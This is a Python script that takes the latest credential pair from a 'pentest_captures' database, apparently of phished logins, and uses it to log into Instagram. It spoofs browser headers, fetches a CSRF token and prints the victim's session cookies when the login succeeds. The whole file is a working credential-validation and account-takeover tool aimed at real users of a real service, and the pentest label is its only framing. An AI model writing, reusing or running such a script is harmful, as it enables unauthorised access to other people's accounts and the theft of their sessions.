import requests
import sqlite3
from datetime import datetime

def get_latest_creds():
    conn = sqlite3.connect('pentest_captures.db')
    c = conn.cursor()
    c.execute("SELECT username, password FROM captures ORDER BY id DESC LIMIT 1")
    row = c.fetchone()
    conn.close()
    return row if row else (None, None)

def ig_login_bot(username, password):
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': 'missing'
    }
    
    # Step 1: Get CSRF token
    r = session.get('https://www.instagram.com/accounts/login/', headers=headers)
    csrf = r.cookies.get('csrftoken', 'missing')
    headers['X-CSRFToken'] = csrf
    
    # Step 2: Login
    login_data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    
    r = session.post('https://www.instagram.com/accounts/login/ajax/', 
                     data=login_data, headers=headers)
    
    result = r.json()
    authenticated = result.get('authenticated', False)
    
    print(f"🤖 BOT LOGIN: {username}")
    print(f"✅ SUCCESS: {authenticated}")
    print(f"📄 Response: {result}")
    
    if authenticated:
        print("🍪 SESSION COOKIES:", session.cookies.get_dict())
        return True, session.cookies.get_dict()
    
    return False, {}

# AUTO-TEST LATEST CAPTURE
if __name__ == '__main__':
    username, password = get_latest_creds()
    if username:
        ig_login_bot(username, password)
    else:
        print("❌ No captures found")